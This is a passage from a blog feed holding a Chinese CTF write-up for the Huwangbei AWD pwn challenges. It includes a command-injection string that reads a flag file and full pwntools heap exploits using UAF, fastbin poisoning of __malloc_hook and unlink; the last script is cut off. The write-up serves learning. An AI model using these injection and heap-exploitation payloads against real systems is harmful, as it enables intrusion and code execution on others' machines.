        &lt;h1 id=&quot;swpu2018&quot;&gt;&lt;a href=&quot;#swpu2018&quot; class=&quot;headerlink&quot; title=&quot;swpu2018&quot;&gt;&lt;/a&gt;swpu2018&lt;/h1&gt;&lt;p&gt;年底忙成狗，没什么时间，花了两个晚上的时间，做了一下简单的题目，还有些题目后面继续补。&lt;/p
      
    
    </summary>
    
    
      <category term="ctf" scheme="https://4f-kira.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>首届护网杯AWD PWN题writeup</title>
    <link href="https://4f-kira.github.io/2018/11/06/huwangbei-awd-pwn/"/>
    <id>https://4f-kira.github.io/2018/11/06/huwangbei-awd-pwn/</id>
    <published>2018-11-06T12:53:16.000Z</published>
    <updated>2018-11-06T13:14:16.058Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上个月在护网杯打了个酱油，第一次打某宁的线下赛，风格跟某春秋差别还是挺大的，没什么端口限制，提flag接口也很友好，属于最开放的网络环境了，可以用各种大杀器（然而我没有准备= =|||）。比赛当时只用到了最简单的洞，虽然官方给了流量（队友不说我都没发现。。。），但是没啥经验，比赛的时候也没成功重放。总体来说题目质量不错，难得有攻击流量，赛后来学习一波吧~</p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>这题有一个超级简单的命令执行洞，直接<code>ls</code>后闭合命令就可以了，如<code>/ &amp;&amp; cat ../flag</code>。另外还有一个堆的洞，网上有大神分析过，我就不写了，直接给EXP，原理差不多，漏洞利用方式略有不同而已。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">msend</span><span class="params">(size,smsg)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'send'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'send:'</span>,str(size))</span><br><span class="line">p.sendafter(<span class="string">'Content:'</span>,smsg)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mrecv</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'recv'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'recv:'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mencode</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'encode'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'encode:'</span>,str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mdecode</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'decode'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'decode:'</span>,str(size))</span><br><span class="line"></span><br><span class="line">msend(<span class="number">0x500</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">mrecv(<span class="number">0x10</span>)</span><br><span class="line">msend(<span class="number">0x500</span>,<span class="string">'a'</span>)</span><br><span class="line">mrecv(<span class="number">0x10</span>)</span><br><span class="line">mencode(<span class="number">8</span>)</span><br><span class="line">mrecv(<span class="number">0x10</span>)</span><br><span class="line">mdecode(<span class="number">8</span>)</span><br><span class="line">libc.address = (u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> + <span class="number">0xff</span>) &amp; <span class="number">0xfffffffff000</span></span><br><span class="line">msend(<span class="number">0x100</span>,<span class="string">'bbbb'</span>)</span><br><span class="line">mrecv(<span class="number">0x78</span>) <span class="comment"># 0x80</span></span><br><span class="line">mrecv(<span class="number">0x68</span>) <span class="comment"># 0x70 fastbins</span></span><br><span class="line">fake_fd = libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x23</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x78</span> + p64(<span class="number">0x71</span>) + p64(fake_fd) <span class="comment"># len = 0x88</span></span><br><span class="line">msend(<span class="number">0x100</span>,payload)</span><br><span class="line">mencode(<span class="number">0x88</span>)</span><br><span class="line">mrecv(<span class="number">0x78</span>) <span class="comment"># overwrite fastbins#0x70-&gt;fd</span></span><br><span class="line">mdecode(<span class="number">0x88</span>)</span><br><span class="line">msend(<span class="number">0x68</span>,<span class="string">''</span>.ljust(<span class="number">0x13</span><span class="number">-8</span>,<span class="string">'a'</span>)+p64(libc.address+<span class="number">0x4526a</span>)+p64(libc.sym[<span class="string">'__libc_realloc'</span>]+<span class="number">8</span>))</span><br><span class="line">mencode(<span class="number">0x20</span>)</span><br><span class="line">mrecv(<span class="number">0x68</span>) <span class="comment"># overwrite  malloc_hook</span></span><br><span class="line">mdecode(<span class="number">0x20</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'send'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'send:'</span>,str(<span class="number">0</span>)) <span class="comment"># trigger malloc</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="store"><a href="#store" class="headerlink" title="store"></a>store</h2><p>这题的复杂程度简直丧心病狂，在此膜一下腾讯的大佬，4小时的比赛能做出这题目。从流量来看，很多队伍都是重发腾讯的流量，还有一队是另一种解法，姿势也是很值得学习。这条题一堆的结构体，单是看程序逻辑都看了半天。大佬们都是风水大师，堆风水6得飞起。</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>这题目的主要功能有两个，一个是操作<code>cake</code>的流程，一个是操作<code>account</code>的流程。其中需要关键操作（对账号操作，对蛋糕下单）需要<code>admin</code>权限，留意程序初始化生成了一个<code>admin</code>账号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __<span class="function">int64 <span class="title">init_admin</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v0; <span class="comment">// ST08_8</span></span><br><span class="line"></span><br><span class="line">  v0 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  is_admin[<span class="number">0</span>] = <span class="number">1L</span>L;</span><br><span class="line">  account_id[<span class="number">0</span>] = <span class="number">1L</span>L;</span><br><span class="line">  user_db[<span class="number">0</span>] = (struct user *)<span class="built_in">malloc</span>(<span class="number">0x80</span>uLL);</span><br><span class="line">  money[<span class="number">0</span>] = <span class="number">880L</span>L;</span><br><span class="line">  <span class="built_in">strncpy</span>(user_db[<span class="number">0</span>]-&gt;name, <span class="string">"Admin"</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">strncpy</span>(user_db[<span class="number">0</span>]-&gt;password, <span class="string">"admin"</span>, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">strncpy</span>(user_db[<span class="number">0</span>]-&gt;desc, <span class="string">"what ? this is cake ???"</span>, <span class="number">0x58</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>cake操作</li></ol><p>几个重要的结构体如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> taste[<span class="number">8</span>];</span><br><span class="line">  __int32 number;</span><br><span class="line">  __int32 code;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> random_num[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">int</span> cake_number;</span><br><span class="line">  <span class="keyword">char</span> cake_taste[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> cake_code[<span class="number">4</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cake_order</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">char</span> taste[<span class="number">8</span>];</span><br><span class="line">  __int32 number;</span><br><span class="line">  __int32 price;</span><br><span class="line">  <span class="keyword">char</span> *desc;  <span class="comment">// 0x7c</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>购买<code>cake</code>的过程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- add_to_list | malloc(0x18) 新增一个list</span><br><span class="line">- order_cake | malloc(0x18) -&gt; malloc(0x7c) -&gt; free(0x18) 新增order及其desc，所有order完成后，从后往前清掉所有list</span><br><span class="line">- cancel_list | free(0x18) 取消一个list</span><br><span class="line">- buy | free(0x7c) -&gt; free(0x18) -&gt; malloc(0x4b0) 清除list的desc，清除list，新增一个desc</span><br></pre></td></tr></table></figure></p><p>内存泄露漏洞点在，创建新<code>cake_list</code>的时候，没有初始化内存，生成的随机数只有一位，重新利旧<code>bins</code>的时候只会覆盖<code>fd</code>的最低位，打印<code>cake_list</code>信息的时候可以泄露地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">new_cake_list = (struct cake_list *)<span class="built_in">malloc</span>(<span class="number">0x18</span>uLL);</span><br><span class="line">v1 = random_();</span><br><span class="line"><span class="built_in">sprintf</span>(&amp;s, <span class="string">"%d"</span>, v1);</span><br><span class="line"><span class="built_in">strncpy</span>(new_cake_list-&gt;random_num, &amp;s, <span class="number">1u</span>LL);</span><br><span class="line">new_cake_list-&gt;cake_number = cake[v3]-&gt;number;</span><br><span class="line"><span class="built_in">strncpy</span>(new_cake_list-&gt;cake_taste, cake[v3]-&gt;taste, <span class="number">8u</span>LL);</span><br><span class="line">*(_DWORD *)new_cake_list-&gt;cake_code = cake[v3]-&gt;code;</span><br><span class="line">cake_list[list_count++] = new_cake_list;</span><br><span class="line">show_cake_list();</span><br></pre></td></tr></table></figure><ol><li>account操作</li></ol><p>结构体如下：(其中<code>user_list</code>存在<code>bss</code>段)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __int64 unknown1;</span><br><span class="line">  __int64 unknown2;</span><br><span class="line">  <span class="keyword">char</span> name[<span class="number">8</span>];</span><br><span class="line">  <span class="keyword">char</span> password[<span class="number">8</span>];</span><br><span class="line">  __int64 used_tag;</span><br><span class="line">  <span class="keyword">char</span> desc[<span class="number">88</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user_list</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  __int64 is_admin;</span><br><span class="line">  __int64 account_id;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">user_data</span>;</span></span><br><span class="line">  __int64 money;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>对<code>account</code>可以进行注册，删除，修改密码这3个操作：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- 注册：malloc(0x80)</span><br><span class="line">- 删除：free(0x80)，没有清空user_list内容</span><br><span class="line">- 修改密码：修改user_data的password字段，8字节</span><br></pre></td></tr></table></figure><p>存在一个明显的<code>UAF</code>，如果能控制<code>user_data</code>，就能任意地址写。</p><p>留意<code>delete_account</code>一个坑点，user删除之后，虽然不会清空<code>user_data</code>指针，但是指针<code>-16</code>了，本来创建一个<code>0x20</code>大小的chunk后，利用UAF可以很轻易地修改<code>chunk size</code>,现在需要将两个<code>0x90</code>的chunk拼起来再padding一堆<code>0x20</code>大小的chunk才能修改<code>chunk size</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( is_admin[<span class="number">4</span> * v3] == <span class="number">3</span> )</span><br><span class="line">&#123;</span><br><span class="line">  is_admin[<span class="number">4</span> * v3] = <span class="number">0L</span>L;</span><br><span class="line">  user_data[<span class="number">4</span> * v3]-&gt;used_tag = <span class="number">0L</span>L;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"The account(%s) deleted success .\n"</span>, user_data[<span class="number">4</span> * v3]-&gt;name);</span><br><span class="line">  <span class="built_in">memset</span>(user_data[<span class="number">4</span> * v3], <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  <span class="built_in">free</span>(user_data[<span class="number">4</span> * v3]);</span><br><span class="line">  user_data[<span class="number">4</span> * v3] = (struct user *)((<span class="keyword">char</span> *)user_data[<span class="number">4</span> * v3] - <span class="number">16</span>); <span class="comment">// 这里是坑</span></span><br></pre></td></tr></table></figure><h3 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h3><h4 id="解题方法一"><a href="#解题方法一" class="headerlink" title="解题方法一"></a>解题方法一</h4><p>首先需要泄露地址，方法很简单</p><ol><li>创建一个新账号（chunk是一个<code>unsorted bins</code>）</li><li>利用<code>add_to_list</code>创建一个新list</li><li>删掉这个账号</li><li>此时利用<code>add_to_list</code>创建一个新list就可以利旧刚刚free的user的chunk，<code>unsorted bins</code>的<code>fd</code>就能泄露出来</li></ol><p>gets hell方法是：使用<code>unlink</code>控制<code>user_data</code>指针，然后劫持got表，关键时如何构造<code>fake chunk</code></p><p>这题目，可控制的输入点只有几个：</p><ol><li>创建账号时输入的<code>name</code>，<code>password</code>，<code>profile</code>，然而删除的时候内存会清空，并没有什么用</li><li>下order时输入的<code>desc</code>，这个比较好用长度有<code>0x7c</code></li><li>购买cake后输入的<code>desc</code>，这个输入长度有<code>0x4b0</code>，也很好用</li></ol><p>构造关键点：</p><ol><li>由于上面提到<code>delete_account</code>的坑，需要将两个<code>0x90</code>的chunk，连在一起使用，才能修改<code>Chunk size</code></li><li>程序没有<code>double free</code>和堆溢出，需要使<code>allocated chunk</code>和<code>free chunk</code>重叠</li></ol><p>构造步骤如下：</p><ul><li>创建一个新账号  <code>chunk 0x90</code></li><li>创建一个新list0 <code>chunk 0x20</code></li><li>创建一个新order0 <code>chunk 0x20 chunk 0x90</code> （会删除list0 <code>free 0x20</code>）</li><li>创建一个新账号  <code>chunk 0x90</code></li><li>创建两个新list0，list1 <code>chunk 0x20</code> <code>chunk 0x20</code></li><li>删除list0 <code>free 0x20</code></li><li>删除user2 <code>free 0x90</code></li><li>创建一个新order1 <code>chunk 0x20 chunk 0x90</code>（会删除list1 <code>free 0x20</code>）</li><li>创建两个新list0，list1 <code>chunk 0x20</code> <code>chunk 0x20</code></li><li>删除user3 <code>free 0x90</code></li><li>购买order0 <code>free 0x90 free 0x20 chunk 0x4c0</code></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">allocated 0x90 #user2 =&gt; order1[desc]</span><br><span class="line">allocated 0x20 #list0 =&gt; list0 =&gt; order1</span><br><span class="line">freed     0x20 #order0</span><br><span class="line">freed     0x90 #order0[desc]</span><br><span class="line">freed     0x90 #user3</span><br><span class="line">allocated 0x20 #list1 =&gt; list0</span><br><span class="line">allocated 0x20 #list1 =&gt; list1</span><br><span class="line">allocated 0x4c0#desc0</span><br></pre></td></tr></table></figure><p>此时，3个<code>freed chunk</code>会合并一起为一个<code>unsorted bins</code>，继续创建新list2-8。这时候，发现修改<code>user3</code>的<code>password</code>，可以修改<code>list8</code>的<code>size</code>，如果把<code>size</code>修改为<code>0x581</code>(0x4c0+0x20+0x20+0x80)，那么删除<code>list8</code>，就能把下面一整片的内存都free掉，<code>top chunk</code>被抬高。</p><p>继续删掉list4-7，然后下order时，会创建<code>desc</code>，会从<code>top chunk</code>处开始分配内存，这个<code>chunk</code>的最后16字节，刚好覆盖到<code>list0</code>的<code>chunk head</code>，经过精心构造，删除<code>list0</code>的时候就可以触发<code>unlink</code>。</p><p>观察一下当前heap的结构，<code>list0</code>前面可控的<code>chunk</code>有<code>order1[desc]</code>，可以在这里构造<code>fake chunk</code>，<code>p64(&amp;p-0x18)+p64(&amp;p-0x10)</code>。将<code>list0</code>的<code>chunk head</code>改为<code>p64(0x1f0)+p64(90)</code>，同时下一块<code>chunk</code>需要补两个<code>allocated chunk</code>，可以在<code>desc0</code>中预留。</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(newID=<span class="string">''</span>,newPWD=<span class="string">''</span>,newDESC=<span class="string">''</span>,reg=<span class="number">0</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> reg:</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'12345'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'12345'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'Register Your User?\n'</span>,<span class="string">'0'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'Enter your New ID.\n'</span>,newID)</span><br><span class="line">        p.sendafter(<span class="string">'Enter your New Password.\n'</span>,newPWD)</span><br><span class="line">        p.sendafter(<span class="string">'Enter your profile.\n'</span>,newDESC)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'Admin'</span>)</span><br><span class="line">        p.sendafter(<span class="string">'&gt; '</span>,<span class="string">'admin'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">logout</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'9'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'sign out?\n'</span>,<span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'4'</span>) <span class="comment"># enter order menu</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_order_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'5'</span>) <span class="comment"># exit order menu</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_to_list</span><span class="params">(code)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'&gt;'</span>,str(code))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">order_cake</span><span class="params">(price,desc)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'4'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'0) Yes, 1) No\n'</span>,<span class="string">'0'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(desc)):</span><br><span class="line">        p.sendafter(<span class="string">'Enter the price'</span>,str(price[i]))</span><br><span class="line">        p.sendafter(<span class="string">'Enter a description'</span>,desc[i])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cancel_list</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'3'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">account_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_account_menu</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_accont</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'delete\n'</span>,str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_password</span><span class="params">(idx,pwd)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">' change PW\n'</span>,str(idx))</span><br><span class="line">    p.sendafter(<span class="string">'New Password.\n'</span>,pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">buy_cake</span><span class="params">(code,number,desc)</span>:</span></span><br><span class="line">    p.sendafter(<span class="string">'Command : '</span>,<span class="string">'2'</span>)</span><br><span class="line">    p.sendafter(<span class="string">'be purchased.\n'</span>,str(code))</span><br><span class="line">    p.sendafter(<span class="string">'to purchase.\n'</span>,str(number))</span><br><span class="line">    p.sendafter(<span class="string">'comment for cake.\n'</span>,desc)</span><br><span class="line"></span><br><span class="line">login(<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,<span class="string">'aaaa'</span>,reg=<span class="number">1</span>)</span><br><span class="line">login()</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">0</span>) <span class="comment">#0 </span></span><br><span class="line">order_cake([<span class="number">1</span>],[<span class="string">'1111'</span>])</span><br><span class="line">exit_order_menu()</span><br><span class="line">logout()</span><br><span class="line">login(<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,<span class="string">'bbbb'</span>,reg=<span class="number">1</span>)</span><br><span class="line">login()</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">add_to_list(<span class="number">2</span>) <span class="comment">#1</span></span><br><span class="line">cancel_list(<span class="number">0</span>)</span><br><span class="line">exit_order_menu()</span><br><span class="line"><span class="comment"># delete account 'aaaa' -&gt; unsorted bins</span></span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">2</span>)</span><br><span class="line">exit_account_menu()</span><br><span class="line"><span class="comment"># leak libc address</span></span><br><span class="line">order_menu()</span><br><span class="line">user2_data = <span class="number">0x604210</span></span><br><span class="line">order_cake([<span class="number">0</span>],[p64(user2_data<span class="number">-0x18</span>)+p64(user2_data<span class="number">-0x10</span>)])</span><br><span class="line">add_to_list(<span class="number">1</span>) <span class="comment">#0</span></span><br><span class="line">add_to_list(<span class="number">2</span>) <span class="comment">#2</span></span><br><span class="line">exit_order_menu()</span><br><span class="line">account_menu()</span><br><span class="line">delete_accont(<span class="number">3</span>)</span><br><span class="line">exit_account_menu()</span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">8</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)</span><br><span class="line">buy_cake(<span class="number">0</span>,<span class="number">10</span>,payload)</span><br><span class="line">order_menu()</span><br><span class="line">add_to_list(<span class="number">3</span>)</span><br><span class="line">libc.address = (u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span>) &amp; <span class="number">0xfffffffff000</span> </span><br><span class="line">add_to_list(<span class="number">4</span>) <span class="comment">#3</span></span><br><span class="line">add_to_list(<span class="number">5</span>) <span class="comment">#4</span></span><br><span class="line">add_to_list(<span class="number">6</span>) <span class="comment">#5</span></span><br><span class="line">add_to_list(<span class="number">7</span>) <span class="comment">#6</span></span><br><span class="line">add_to_list(<span class="number">8</span>) <span class="comment">#7</span></span><br><span class="line">add_to_list(<span class="number">9</span>) <span class="comment">#8</span></span><br><span class="line">exit_order_menu()</span><br><span class="line">account_menu()</span><br><span class="line"></span><br><span class="line">change_password(<span class="number">3</span>,p64(<span class="number">0x581</span>)) <span class="comment"># overwite list[0] chunk size</span></span><br><span class="line">exit_account_menu()</span><br><span class="line">order_menu()</span><br><span class="line"><span 